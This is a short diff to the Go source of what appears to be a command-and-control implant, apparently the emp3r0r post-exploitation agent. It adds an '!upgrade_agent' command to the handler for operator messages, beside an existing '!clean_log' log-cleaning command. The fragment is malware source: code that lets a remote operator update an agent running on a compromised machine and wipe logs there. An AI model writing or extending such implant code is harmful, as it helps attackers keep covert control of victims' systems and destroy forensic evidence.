@@ -458,6 +458,15 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		}
 		sendResponse(out)
 
+		// upgrade
+	case "!upgrade_agent":
+		out = "Done"
+		err = Upgrade()
+		if err != nil {
+			out = err.Error()
+		}
+		sendResponse(out)
+
 		// log cleaner
 	case "!clean_log":
 		if len(cmdSlice) != 2 {
